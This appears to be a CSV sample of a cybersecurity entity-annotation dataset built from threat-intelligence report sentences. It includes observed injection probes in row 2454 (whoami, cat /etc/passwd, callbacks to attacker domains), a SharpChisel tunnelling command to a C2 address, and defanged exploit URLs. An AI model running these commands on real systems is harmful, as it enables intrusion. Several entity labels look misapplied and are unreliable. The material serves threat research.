id,text,entities,relations,Comments
4844,This is detailed in depth in today’s Reuters investigation into the Indian hack-for-hire ecosystem.,"[{'id': 50803, 'label': 'location', 'start_offset': 68, 'end_offset': 74}
 {'id': 50802, 'label': 'attack-pattern', 'start_offset': 75, 'end_offset': 88}]",[],[]
4234,This one is called “sysctrls” and it looks for files with the following extensions:  ,[],[],[]
3624, A good example of a generalized phishing campaign is the Blank Slate Campaign we wrote about in March 2017.,"[{'id': 49409, 'label': 'campaign', 'start_offset': 58, 'end_offset': 78}
 {'id': 49410, 'label': 'TIME', 'start_offset': 97, 'end_offset': 107}
 {'id': 49408, 'label': 'attack-pattern', 'start_offset': 33, 'end_offset': 50}]","[{'id': 793, 'from_id': 49409, 'to_id': 49408, 'type': 'uses'}]",[]
5333,The child process writes four bytes to the SSL socket.,[],[],[]
13236,"Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in Microsoft Office’s Equation Editor (EQNEDT32.EXE).","[{'id': 41274, 'label': 'location', 'start_offset': 72, 'end_offset': 80}
 {'id': 41275, 'label': 'identity', 'start_offset': 90, 'end_offset': 99}
 {'id': 41276, 'label': 'tools', 'start_offset': 100, 'end_offset': 106}
 {'id': 41277, 'label': 'threat-actor', 'start_offset': 109, 'end_offset': 117}]",[],[]
2454,ls nslookup%20[redacted].test6.ggdd[.]co[.]uk nslookup+[redacted].test6.ggdd[.]co[.]uk ping%20[redacted].test6.ggdd[.]co[.]uk ping+[redacted].test6.ggdd[.]co[.]uk whoami cat%20/etc/passwd cat+/etc/passwd id ifconfig ipconfig ping%20[redacted].burpcollaborator[.]net  ,"[{'id': 45521, 'label': 'FILEPATH', 'start_offset': 192, 'end_offset': 203}
 {'id': 45522, 'label': 'DOMAIN', 'start_offset': 233, 'end_offset': 265}
 {'id': 45523, 'label': 'DOMAIN', 'start_offset': 131, 'end_offset': 161}
 {'id': 45524, 'label': 'DOMAIN', 'start_offset': 14, 'end_offset': 45}
 {'id': 45525, 'label': 'DOMAIN', 'start_offset': 55, 'end_offset': 86}
 {'id': 45520, 'label': 'FILEPATH', 'start_offset': 176, 'end_offset': 187}
 {'id': 45526, 'label': 'DOMAIN', 'start_offset': 94, 'end_offset': 125}
 {'id': 7335, 'label': 'tools', 'start_offset': 207, 'end_offset': 215}
 {'id': 7336, 'label': 'tools', 'start_offset': 216, 'end_offset': 224}
 {'id': 47522, 'label': 'tools', 'start_offset': 163, 'end_offset': 169}
 {'id': 47523, 'label': 'tools', 'start_offset': 46, 'end_offset': 54}
 {'id': 47525, 'label': 'tools', 'start_offset': 87, 'end_offset': 91}
 {'id': 47526, 'label': 'tools', 'start_offset': 126, 'end_offset': 130}
 {'id': 47524, 'label': 'tools', 'start_offset': 3, 'end_offset': 11}
 {'id': 47527, 'label': 'tools', 'start_offset': 225, 'end_offset': 229}]",[],[]
13805,"If yes, it modifies the process ID, which should open on another Windows Service PID.",[],[],[]
76,"Across the changing landscape of botnet herders, Banking Trojans, ransomware and coin mining is one constant: the business-savvy drive to maximize profit and reduce risk.",[],[],[]
820,The vulnerability exists in the Windows CryptoAPI (Crypt32.dll) and specifically relates to the method used for Elliptic Curve Cryptography (ECC) certificate validation.,"[{'id': 46367, 'label': 'FILEPATH', 'start_offset': 51, 'end_offset': 62}
 {'id': 46368, 'label': 'SOFTWARE', 'start_offset': 32, 'end_offset': 49}]",[],[]
6485,We then see the threat actor again attempting to use SharpChisel several times using the following command: C:\programdata\SharpChisel.exe  client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999  powershell.exe C:\programdata\SharpChisel.exe client 87.236.212[.]184:8080 R:8888:127.0.0.1:9999,[],[],[]
1198,This can include receiving instructions from a cloud server under the control of the SDK author.,[],[],[]
14205,"Open-source ransomware projects EDA2 and Hidden Tear—supposedly created for educational purposes—were hosted on GitHub, and have since spawned various offshoots that have been found targeting enterprises.",[],[],[]
2527," Usually, the more successful ransomware operators put a lot of effort into establishing and maintaining some semblance of “integrity” as a way of facilitating ransom payments from victims.",[],[],[]
10217,Related Malware hashes: Top Phishing Domains:,"[{'id': 31207, 'label': 'attack-pattern', 'start_offset': 28, 'end_offset': 36}]",[],[]
7309,TCP stream excerpt of the malware receiving commands from C&C server,[],[],[]
2597,"This initial focus has led to speculation that Lapsus$ Group may be Brazilian, although we understand the choice of targets to have been influenced by extended team members rather than the team leadership.","[{'id': 47788, 'label': 'threat-actor', 'start_offset': 47, 'end_offset': 54}
 {'id': 47789, 'label': 'location', 'start_offset': 68, 'end_offset': 77}]","[{'id': 356, 'from_id': 47788, 'to_id': 47789, 'type': 'located-at'}]",[]
14201,With additional analysis from Cyber Safety Solutions Team Developers constantly need to modify and rework their source codes when releasing new versions of applications or coding projects they create and maintain.,[],[],[]
2450," Table 1. Parameters used by webshells seen in hits on ""Spring Core Remote Code Execution Vulnerability"" signature.","[{'id': 47518, 'label': 'vulnerability', 'start_offset': 56, 'end_offset': 103}
 {'id': 47519, 'label': 'attack-pattern', 'start_offset': 29, 'end_offset': 38}]",[],[]
1772,"The three vulnerabilities each contain code to alter a user-controlled address, and the code can be distilled down to the following operations:",[],[],[]
7682,".ISO, enabled macros for entry dropping ServHelper or FlawedAmmyy","[{'id': 23899, 'label': 'malware', 'start_offset': 40, 'end_offset': 50}
 {'id': 23900, 'label': 'malware', 'start_offset': 54, 'end_offset': 65}]",[],[]
7991,"Once the target agreed to the deal, a malware landing page disguised as a software download URL was sent via email or a PDF on Google Drive, and in a few cases, Google documents containing the phishing links.","[{'id': 24771, 'label': 'location', 'start_offset': 9, 'end_offset': 15}
 {'id': 24772, 'label': 'location', 'start_offset': 30, 'end_offset': 34}
 {'id': 24773, 'label': 'location', 'start_offset': 46, 'end_offset': 53}
 {'id': 24774, 'label': 'location', 'start_offset': 54, 'end_offset': 58}
 {'id': 24776, 'label': 'location', 'start_offset': 141, 'end_offset': 144}
 {'id': 24778, 'label': 'attack-pattern', 'start_offset': 193, 'end_offset': 201}]",[],[]
12418,"In the video, they purported to show a successful working exploit that spawns a cmd.exe shell, but a careful review of the video shows the exploit is fake.","[{'id': 38610, 'label': 'malware', 'start_offset': 80, 'end_offset': 87}
 {'id': 38611, 'label': 'location', 'start_offset': 88, 'end_offset': 93}]",[],[]
1633,"Unfortunately for them, this gave us additional insight into their operation.",[],[],[]
4163,We found some special mutexes that are encoded by the layout of the Chinese Zhuyin keyboard in ChiserClient.,"[{'id': 49969, 'label': 'malware', 'start_offset': 95, 'end_offset': 107}]",[],[]
2166, Microsoft has since released protection guidance and assigned CVE-2022-30190 to this vulnerability.,"[{'id': 45406, 'label': 'identity', 'start_offset': 1, 'end_offset': 10}
 {'id': 45407, 'label': 'vulnerability', 'start_offset': 63, 'end_offset': 77}]",[],[]
1388, 13. Targeted files greater than one megabyte are truncated to one megabyte when overwritten.,[],[],[]
3006,"This will also protect these apps on your tablets, smartphones, PCs and Macs.",[],[],[]
7389, Figure 6. Current variables for rsync (the Shellbot)  Figure 7. Connects to C&C to send current control variables,[],[],[]
5200,The built-in RTPS discovery protocol is used in peer-to-peer networks to discover the locator of each participant (such as IP address and UDP/TCP port or offset in shared memory).,[],[],[]
4645,"When launched, the tool makes an HTTP GET request to a C2 to check for a response body of ""OK'' and will terminate if it's not found.",[],[],[]
5377,      Figure 10. VPNFilter “dstr” third-stage code for writing to raw flash memory      System reconnaissance (0x08) This module is responsible for sending information from the infected device to the C&C server.,"[{'id': 16498, 'label': 'malware', 'start_offset': 17, 'end_offset': 26}]",[],[]
4703,"Our Threat Analysis Group, or TAG, is dedicated to protecting users from threats posed by state-sponsored malware attacks and other advanced persistent threats.","[{'id': 50590, 'label': 'identity', 'start_offset': 4, 'end_offset': 25}
 {'id': 50591, 'label': 'identity', 'start_offset': 30, 'end_offset': 33}]",[],[]
8662,Unique URLs serving ​​CVE-2021-33742 Internet Explorer exploit: http://lioiamcount[.]com/IsnoMLgankYg6/EjlYIy7cdFZFeyFqE4IURS1 http://db-control-uplink[.]com/eFe1J00hISDe9Zw/gzHvIOlHpIXB http://kidone[.]xyz/VvE0yYArmvhyTl/GzV,"[{'id': 26746, 'label': 'URL', 'start_offset': 64, 'end_offset': 88}
 {'id': 26747, 'label': 'URL', 'start_offset': 127, 'end_offset': 136}
 {'id': 26748, 'label': 'URL', 'start_offset': 187, 'end_offset': 206}]",[],[]
4120,Opens command shell 0x5007 Unknown 0x5009 Closes command shell 0x500A,[],[],[]
4619,"Since the web shell runs as the SYSTEM user, an attacker can fetch the NT LAN Manager (NTLM) hashes of the logged-in users, create or delete accounts, and perform extensive post-exploitation activities on the Exchange Server.      Figure - Executing Mimikatz as SYSTEM using CC      Fig - System Owner User Discovery     The above event was triggered when we ran whoami from within the Chopper web shell.","[{'id': 50529, 'label': 'SOFTWARE', 'start_offset': 209, 'end_offset': 224}
 {'id': 50530, 'label': 'malware', 'start_offset': 386, 'end_offset': 403}
 {'id': 50531, 'label': 'tools', 'start_offset': 250, 'end_offset': 258}
 {'id': 50528, 'label': 'attack-pattern', 'start_offset': 10, 'end_offset': 19}]",[],[]
1619,"This data, along with an encoded version of the Terms of Service are stored as static strings in the Android package file.",[],[],[]
6311," We encourage all security vendors to create protections to detect activity from this tool and all organizations to be on alert for activity from this tool.  Palo Alto Networks customers receive protections from the threats described in this blog through Threat Prevention, Cortex XDR and WildFire malware analysis.","[{'id': 19580, 'label': 'location', 'start_offset': 18, 'end_offset': 26}
 {'id': 19581, 'label': 'location', 'start_offset': 86, 'end_offset': 90}
 {'id': 19582, 'label': 'location', 'start_offset': 91, 'end_offset': 94}
 {'id': 19583, 'label': 'location', 'start_offset': 122, 'end_offset': 127}
 {'id': 19584, 'label': 'location', 'start_offset': 151, 'end_offset': 155}
 {'id': 19587, 'label': 'location', 'start_offset': 285, 'end_offset': 288}
 {'id': 19588, 'label': 'malware', 'start_offset': 289, 'end_offset': 297}]",[],[]
10484,We haven’t retrieved a copy of the exploit.,[],[],[]
13918,"In total, more than 2 TB of stolen data is currently being hosted on DarkSide sites, and 100% of victims’ stolen files are leaked.","[{'id': 48740, 'label': 'malware', 'start_offset': 69, 'end_offset': 77}]",[],[]
3830,"If Koadic finds that the system is conducive to the attacker’s interests, it downloads a base64-encrypted version of the ANEL malware from the Command-and-Control (C&C) server and executes it.  Encrypted ANEL is decrypted using the “certutil -docode” command.","[{'id': 11615, 'label': 'malware', 'start_offset': 121, 'end_offset': 125}
 {'id': 11618, 'label': 'malware', 'start_offset': 204, 'end_offset': 208}
 {'id': 49688, 'label': 'malware', 'start_offset': 3, 'end_offset': 9}]","[{'id': 859, 'from_id': 49688, 'to_id': 11615, 'type': 'downloads'}]",[]
1278," Three of the backdoors, NFlog, PoisonIvy, and NewCT have previously been publicly associated with DragonOK.","[{'id': 44962, 'label': 'malware', 'start_offset': 25, 'end_offset': 30}
 {'id': 44963, 'label': 'malware', 'start_offset': 32, 'end_offset': 41}
 {'id': 44964, 'label': 'malware', 'start_offset': 47, 'end_offset': 52}
 {'id': 44965, 'label': 'threat-actor', 'start_offset': 99, 'end_offset': 107}]","[{'id': 48, 'from_id': 44962, 'to_id': 44965, 'type': 'authored-by'}
 {'id': 47, 'from_id': 44963, 'to_id': 44965, 'type': 'authored-by'}
 {'id': 46, 'from_id': 44964, 'to_id': 44965, 'type': 'authored-by'}]",[]
14394,XDR is intended to be that security data lake of deeper enterprise infrastructure and security information than we’ve previously gathered in a single addressable pool and designed to be useful for threat hunters and analysts.,"[{'id': 51776, 'label': 'SOFTWARE', 'start_offset': 0, 'end_offset': 3}]",[],[]
4708,"TAG tracks and proactively counters serious state-sponsored and financially motivated information cyber criminal activities, such as hacking and the use of spyware.","[{'id': 50596, 'label': 'identity', 'start_offset': 0, 'end_offset': 3}]",[],[]
